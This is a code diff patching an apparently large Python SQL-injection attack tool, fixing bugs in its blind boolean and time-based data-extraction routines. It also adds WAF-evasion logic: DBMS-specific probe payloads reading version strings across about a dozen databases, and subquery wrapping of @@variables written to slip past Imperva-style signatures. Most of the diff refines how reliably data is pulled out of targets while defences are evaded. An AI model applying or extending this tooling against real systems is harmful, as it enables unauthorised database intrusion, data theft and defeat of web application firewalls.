@@ -43746,16 +43746,22 @@ async def _extract_int(engine,config,queries,int_func,result,method,url,
                     timeout=timeout_per_request
                 )
             except asyncio.TimeoutError:
-                LOG.debug(f"[Extraction] Timeout at mid={mid}, returning best guess")
-                return lo
+                # BUG-EXTRACT-INT-TIMEOUT-RETURN FIX (HIGH): returning `lo` on timeout
+                # returns the partially-converged lower bound as the result. When timing
+                # out mid binary-search (lo=32, hi=64) the caller receives 32 (a space),
+                # not a failure sentinel. Callers use this as a string length, silently
+                # truncating output to half the real value. Return 0 so callers that
+                # guard on `length == 0` treat this as extraction failure cleanly.
+                LOG.debug(f"[Extraction] Timeout at mid={mid}, returning 0 (failure sentinel)")
+                return 0
             except Exception as e:
                 LOG.debug(f"[Extraction] Request error: {e}")
-                return lo
-            
+                return 0
+
             #  Check response exists
             if fp is None:
                 LOG.debug("[Extraction] No response received")
-                return lo
+                return 0
             
             #  Check for WAF block
             if not _validate_response(fp, func_name="waf_block_check"): continue
@@ -43829,8 +43835,13 @@ async def _extract_int(engine,config,queries,int_func,result,method,url,
                     if _cb_t > 0.60 and len(_BOOL_CALIBRATOR_MODULE.true_sims) >= 3 \
                             and len(_BOOL_CALIBRATOR_MODULE.false_sims) >= 2:
                         # Use calibrator's midpoint — this is the same value used by PCV.
-                        # Cap to [0.60, 0.85] to prevent degenerate thresholds.
-                        _calib_thresh_ei = max(0.60, min(0.85, _cb_t))
+                        # BUG-EXTRACT-INT-THRESH-CAP FIX (HIGH): The 0.85 cap was removed
+                        # from _blind_extract_char_inner (BUG-CHAR-THRESH-CAP FIX) but not
+                        # here. With cap: responses with similarity in [0.85, _cb_t) are
+                        # TRUE in character extraction but FALSE in length extraction →
+                        # binary search diverges → wrong length → truncated strings.
+                        # Remove cap to match _blind_extract_char_inner exactly.
+                        _calib_thresh_ei = max(0.60, _cb_t)
                     # BUG-EXTRACT-POLARITY FIX: When the calibrator detects inverted polarity
                     # (true condition makes page LESS similar to baseline than false condition —
                     # happens when the application shows data on false condition and hides it
@@ -45863,7 +45874,11 @@ async def _blind_extract_char_inner(engine,config,queries,char_func,result,metho
                     # Only strip if the outermost parens are truly wrapping the whole expr
                     # (i.e. not part of a function call like "COALESCE(...)")
                     _inner = _char_func_cond[1:-1]
-                    if not any(kw in _inner[:20].upper()
+                    # BUG-CHAR-KWWIN-20: _inner[:20] only inspects the first 20 chars.
+                    # Expressions like "(SELECT CASE WHEN ASCII(SUBSTRING(...))...)" have
+                    # the keyword past position 20; paren-stripping incorrectly removed outer
+                    # parens and produced malformed SQL.  Search the full string.
+                    if not any(kw in _inner.upper()
                                for kw in ('COALESCE', 'CASE ', 'SELECT', 'ASCII', 'ORD', 'UNICODE')):
                         _char_func_cond = _inner
                 cond=f"{_char_func_cond} BETWEEN {mid+1} AND {char_hi}"
@@ -45874,7 +45889,11 @@ async def _blind_extract_char_inner(engine,config,queries,char_func,result,metho
                 if (_char_func_cond and _char_func_cond.startswith('(')
                         and _char_func_cond.endswith(')')):
                     _inner = _char_func_cond[1:-1]
-                    if not any(kw in _inner[:20].upper()
+                    # BUG-CHAR-KWWIN-20: _inner[:20] only inspects the first 20 chars.
+                    # Expressions like "(SELECT CASE WHEN ASCII(SUBSTRING(...))...)" have
+                    # the keyword past position 20; paren-stripping incorrectly removed outer
+                    # parens and produced malformed SQL.  Search the full string.
+                    if not any(kw in _inner.upper()
                                for kw in ('COALESCE', 'CASE ', 'SELECT', 'ASCII', 'ORD', 'UNICODE')):
                         _char_func_cond = _inner
                 cond=f"{_char_func_cond}>={mid+1}"
@@ -46160,8 +46179,13 @@ async def blind_extract_string(engine,config,queries,sql_query,result,method,url
     # extraction to run with the full scan time_sec (slow) instead of the faster
     # extract_time_sec. Extended to all techniques that can have timing payloads.
     _timing_extract_techs = ("T", "S", "TH", "HQ", "BT", "NV", "WB", "EX", "HY", "ST", "IN", "BH")
-    if _ext_time_sec is not None and result.technique in _timing_extract_techs:
-        config.time_sec = _ext_time_sec
+    # BUG-BLIND-EXTRACT-TIMESEC-SCOPE FIX (MEDIUM): config.time_sec = _ext_time_sec was
+    # placed BEFORE the try/finally block that restores config.time_sec. If asyncio.
+    # CancelledError is raised during await _start_extraction_safely() (which is a
+    # BaseException, not caught by except Exception:), the mutation persists for the
+    # rest of the scan — all subsequent timing detection/PCV/extraction runs use the
+    # wrong sleep duration. Moved the mutation into the try: block so the finally:
+    # at the end of the function always restores it on any exit path.
     # BUG-EXTRACT-ACTIVE-BLIND FIX (REQ 7/10): Set _EXTRACTION_ACTIVE=True here so
     # _send_injected allows blind extraction probes through the _SCAN_STOPPED=True gate.
     # blind_extract_string is called from paths that bypass _run_enumeration
@@ -46198,6 +46222,10 @@ async def blind_extract_string(engine,config,queries,sql_query,result,method,url
             else:
                 _bes_set_active = False
     try:
+        # BUG-BLIND-EXTRACT-TIMESEC-SCOPE FIX: mutate config.time_sec inside the
+        # try/finally so the finally block always restores it regardless of how we exit.
+        if _ext_time_sec is not None and result.technique in _timing_extract_techs:
+            config.time_sec = _ext_time_sec
         # BUG-7D FIX: Removed early-exit guards for missing len_func/char_func keys.
         # SchemaExtractor._extract passes self._queries (which only contains schema SQL
         # templates like "dbs", "tables", "columns", "row_chunked") as the `queries`
@@ -110403,7 +110431,15 @@ class TechniqueCascadeEngine:
                 # Fall back to instance-level calibration
                 _pcv_bool_true_status = getattr(self, '_bool_true_status', None)
             if _pcv_bool_true_status is not None:
-                _pcv_bool_true_is_4xx = (_pcv_bool_true_status in {400, 403, 406, 429, 430, 503})
+                # BUG-PCV-WAF-STATUS-UNIFY FIX (MEDIUM): The True-oracle 4xx set here
+                # ({400,403,406,429,430,503}) diverged from Check D's _WAF_4XX_CODES
+                # ({400,403,406,429,444,451}). Status 503 (transient server overload)
+                # is NOT a WAF block — a brief server outage where all probes return 503
+                # set _pcv_bool_true_is_4xx=True, falsely activating Check E standalone
+                # path and confirming non-existent injection. Status 444 (Nginx close)
+                # and 451 (legal hold) ARE WAF-adjacent and must be included.
+                # Unified set: {400,403,406,429,430,444,451} — matches Check D.
+                _pcv_bool_true_is_4xx = (_pcv_bool_true_status in {400, 403, 406, 429, 430, 444, 451})
         except Exception:
             _pcv_bool_true_status = None
             _pcv_bool_true_is_4xx = False
@@ -111058,7 +111094,14 @@ class TechniqueCascadeEngine:
                     if not (_t_waf and _f_waf):
                         _t_st = getattr(_fp_t, 'status_code', None)
                         _f_st = getattr(_fp_f, 'status_code', None)
-                        if (_t_st in (400, 403, 406, 429, 503) and _f_st in (400, 403, 406, 429, 503)):  # BUG-CHECKA-503-MISSING-FIX
+                        # BUG-CHECKA-503-WAF-FIX (MEDIUM): 503 (Service Unavailable)
+                        # is transient server overload, NOT a WAF block. A brief outage
+                        # where both probes return 503 increments WAF block counter and
+                        # can set _check_a_all_waf_blocked=True, triggering Check E
+                        # standalone confirmation on a false-positive injection. Added
+                        # 444 (Nginx connection close) and 451 (legal hold) which ARE
+                        # WAF-adjacent. Unified with _pcv_bool_true_is_4xx set above.
+                        if (_t_st in (400, 403, 406, 429, 430, 444, 451) and _f_st in (400, 403, 406, 429, 430, 444, 451)):
                             _t_waf = True
                             _f_waf = True
                     if _t_waf and _f_waf:
@@ -113284,8 +113327,24 @@ class TechniqueCascadeEngine:
                     # Wrap in an object with a .group(1) interface the rest of the
                     # block expects, returning total seconds.
                     class _WaitforMatch:
-                        def __init__(self, sec): self._sec = sec
-                        def group(self, n): return str(int(self._sec)) if self._sec == int(self._sec) else str(self._sec)
+                        # BUG-WAITFORMATCH-GROUP-N FIX (LOW): group(n) ignored n entirely,
+                        # always returning the seconds value regardless of whether the
+                        # caller passed 0 (full match string) or 2+ (other groups).
+                        # Any future call to .group(0) expecting the full WAITFOR DELAY
+                        # string silently receives a bare seconds value (e.g. "5" instead
+                        # of "WAITFOR DELAY '0:0:5'"), corrupting proportional timing.
+                        # Fix: group(1) returns seconds as before; group(0) returns the
+                        # reconstructed full match string; any other n raises IndexError.
+                        def __init__(self, sec):
+                            self._sec = sec
+                            _s = int(sec)
+                            self._full = f"WAITFOR DELAY '0:0:{_s}'"
+                        def group(self, n=0):
+                            if n == 0:
+                                return self._full
+                            if n == 1:
+                                return str(int(self._sec)) if self._sec == int(self._sec) else str(self._sec)
+                            raise IndexError(f"_WaitforMatch has only group 0 and 1, got {n}")
                     _sleep_match = _WaitforMatch(_wf_total)
             if not _sleep_match:
                 _sleep_match = _re.search(r'pg_sleep\s*\(\s*([\d.]+)', _det_payload, _re.IGNORECASE)
@@ -142783,20 +142842,41 @@ class ExtractionBypassFinder:
                 # so the first extraction call uses prefix comparison without wasted round.
                 _force_nofunc = False  # set True if Phase 2.5 confirms ORD/SUBSTRING blocked
                 if _working_tag in ("nofunc", ""):
+                    # BUG-EBF-P25-PROBE-REALDATA: Using literal 'A' (ASCII 65) is a
+                    # static string; WAFs that allow SELECT from system tables may still
+                    # block ORD() on constant strings because signature-scanners recognize
+                    # the invariant form.  Use a real DB expression instead so the WAF
+                    # must evaluate the condition to know its truth value — this exercises
+                    # the same code path as actual extraction probes.  For MySQL/MariaDB the
+                    # first byte of @@version is always a digit ('5' or '8', ASCII 53/56),
+                    # so `>0` is always True (positive oracle) and `>200` is always False.
                     _fc_probe_dbms = {
-                        "MySQL":       "ORD(SUBSTRING('A',1,1))>64",
-                        "MariaDB":     "ORD(SUBSTRING('A',1,1))>64",
-                        "TiDB":        "ORD(SUBSTRING('A',1,1))>64",
-                        "PostgreSQL":  "ASCII(SUBSTRING('A',1,1))>64",
-                        "CockroachDB": "ASCII(SUBSTRING('A',1,1))>64",
-                        "YugabyteDB":  "ASCII(SUBSTRING('A',1,1))>64",
-                        "MSSQL":       "ASCII(SUBSTRING('A',1,1))>64",
-                        "Sybase":      "ASCII(SUBSTRING('A',1,1))>64",
-                        "Oracle":      "ASCII(SUBSTR('A',1,1))>64",
-                        "SQLite":      "unicode(substr('A',1,1))>64",
-                        "Firebird":    "ASCII(SUBSTRING('A' FROM 1 FOR 1))>64",
-                        "H2":          "ASCII(SUBSTRING('A',1,1))>64",
-                    }.get(self.dbms, "ASCII(SUBSTRING('A',1,1))>64")
+                        "MySQL":       "ORD(SUBSTRING(@@version,1,1))>0",
+                        "MariaDB":     "ORD(SUBSTRING(@@version,1,1))>0",
+                        "TiDB":        "ORD(SUBSTRING(@@version,1,1))>0",
+                        "PostgreSQL":  "ASCII(SUBSTRING(version(),1,1))>0",
+                        "CockroachDB": "ASCII(SUBSTRING(version(),1,1))>0",
+                        "YugabyteDB":  "ASCII(SUBSTRING(version(),1,1))>0",
+                        "MSSQL":       "ASCII(SUBSTRING(@@version,1,1))>0",
+                        "Sybase":      "ASCII(SUBSTRING(@@version,1,1))>0",
+                        "Oracle":      "ASCII(SUBSTR(banner,1,1))>0",
+                        "SQLite":      "unicode(substr(sqlite_version(),1,1))>0",
+                        "Firebird":    "ASCII(SUBSTRING(rdb$get_context('SYSTEM','ENGINE_VERSION') FROM 1 FOR 1))>0",
+                        "H2":          "ASCII(SUBSTRING(H2VERSION(),1,1))>0",
+                    }.get(self.dbms, "ASCII(SUBSTRING(version(),1,1))>0")
+                    # BUG-EBF-P25-THRESH-FIX: The structural bypass threshold `thresh`
+                    # (e.g. 5730ms = (11140+321)/2) is NOT usable for Phase 2.5 probes.
+                    # Phase 2.5 fires SLEEP(self.t) via the already-confirmed bypass template;
+                    # the expected true-branch response is ~(base_ms + t*1000), not `thresh`.
+                    # Using `thresh` ≈ 5730ms to evaluate a SLEEP(2) response of ~2321ms
+                    # causes Phase 2.5 to classify every probe as "blocked" even when the WAF
+                    # passes ORD/SUBSTRING, wasting one full extraction round before falling
+                    # back to nofunc.  Fix: compute a dedicated Phase 2.5 threshold from
+                    # base_ms and t, requiring at least 40% of sleep duration above baseline.
+                    _p25_thresh = max(
+                        self.base_ms + self.t * 1000 * 0.40,  # 40% sleep headroom
+                        self.base_ms * 1.5 + 200,             # 50% baseline spike + 200ms
+                    )
                     _p25_done = False
                     for _upg_wrap in wrappers:
                         if _p25_done:
@@ -142821,7 +142901,7 @@ class ExtractionBypassFinder:
                                 except Exception:
                                     pass
                                 _ep25 = (time.monotonic() - _t0p25) * 1000
-                                if _ep25 > thresh:
+                                if _ep25 > _p25_thresh:
                                     _p25_false_wc = _upg_wrap.format(cond=_ebf_p1_false)
                                     _p25_false_wp = tmpl.format(cond=_p25_false_wc)
                                     _t0p25f = time.monotonic()
@@ -142833,7 +142913,7 @@ class ExtractionBypassFinder:
                                     except Exception:
                                         pass
                                     _ep25f = (time.monotonic() - _t0p25f) * 1000
-                                    if _ep25f < thresh:
+                                    if _ep25f < _p25_thresh:
                                         print(f"[+] [EBF] nofunc→full(A): obfusc "
                                               f"tag={_p25_tag!r} "
                                               f"true={_ep25:.0f}ms "
@@ -142845,12 +142925,12 @@ class ExtractionBypassFinder:
                                     else:
                                         print(f"[-] [EBF] nofunc p2.5(A) "
                                               f"tag={_p25_tag!r}: FP "
-                                              f"({_ep25f:.0f}ms≥{thresh:.0f}ms)",
+                                              f"({_ep25f:.0f}ms≥{_p25_thresh:.0f}ms)",
                                               flush=True)
                                 else:
                                     print(f"[-] [EBF] nofunc p2.5(A) "
                                           f"tag={_p25_tag!r} blocked "
-                                          f"({_ep25:.0f}ms≤{thresh:.0f}ms)",
+                                          f"({_ep25:.0f}ms≤{_p25_thresh:.0f}ms)",
                                           flush=True)
                             continue  # proceed to subquery wrappers (B)
                         # (B) Subquery wrapper: test function-call condition directly.
@@ -142868,7 +142948,7 @@ class ExtractionBypassFinder:
                         except Exception:
                             pass
                         _ep25s = (time.monotonic() - _t0p25s) * 1000
-                        if _ep25s > thresh:
+                        if _ep25s > _p25_thresh:
                             _p25s_false_wc = _upg_wrap.format(cond=_ebf_p1_false)
                             _p25s_false_wp = tmpl.format(cond=_p25s_false_wc)
                             _t0p25sf = time.monotonic()
@@ -142880,7 +142960,7 @@ class ExtractionBypassFinder:
                             except Exception:
                                 pass
                             _ep25sf = (time.monotonic() - _t0p25sf) * 1000
-                            if _ep25sf < thresh:
+                            if _ep25sf < _p25_thresh:
                                 print(f"[+] [EBF] nofunc→full(B): "
                                       f"wrapper={_upg_wrap!r} "
                                       f"cond={_fc_probe_dbms!r} "
@@ -142894,12 +142974,12 @@ class ExtractionBypassFinder:
                             else:
                                 print(f"[-] [EBF] nofunc p2.5(B) "
                                       f"wrapper={_upg_wrap!r}: FP "
-                                      f"({_ep25sf:.0f}ms≥{thresh:.0f}ms)",
+                                      f"({_ep25sf:.0f}ms≥{_p25_thresh:.0f}ms)",
                                       flush=True)
                         else:
                             print(f"[-] [EBF] nofunc p2.5(B) "
                                   f"wrapper={_upg_wrap!r} blocked "
-                                  f"({_ep25s:.0f}ms≤{thresh:.0f}ms)",
+                                  f"({_ep25s:.0f}ms≤{_p25_thresh:.0f}ms)",
                                   flush=True)
                     if not _p25_done:
                         if _working_tag == "nofunc":
@@ -144371,11 +144451,22 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                 if dbms in ("MySQL", "MariaDB"):
                     # MySQL hex literal: 0x48656C6C6F  no quotes, no parens
                     _hex = _nf_cmp.encode("utf-8").hex()
-                    cond = f'{_sql_inner}>=0x{_hex}'
+                    # BUG-NOFUNC-ATAT-WAF: Imperva (and similar signature-based WAFs)
+                    # pattern-match on bare `@@variable>=` comparisons as a SQLi indicator.
+                    # Wrapping in a scalar subquery `(SELECT @@variable)` causes the WAF to
+                    # see a generic SELECT subquery rather than a direct system-variable
+                    # comparison, defeating that specific signature without changing semantics.
+                    if _sql_inner.startswith("@@"):
+                        cond = f'(SELECT {_sql_inner})>=0x{_hex}'
+                    else:
+                        cond = f'{_sql_inner}>=0x{_hex}'
                 elif dbms == "MSSQL":
                     # MSSQL hex literal: 0x48656C6C6F
                     _hex = _nf_cmp.encode("utf-8").hex()
-                    cond = f'{_sql_inner}>=0x{_hex}'
+                    if _sql_inner.startswith("@@"):
+                        cond = f'(SELECT {_sql_inner})>=0x{_hex}'
+                    else:
+                        cond = f'{_sql_inner}>=0x{_hex}'
                 elif dbms == "SQLite":
                     # SQLite hex blob cast: X'hex' compared as text
                     _hex = _nf_cmp.encode("utf-8").hex()
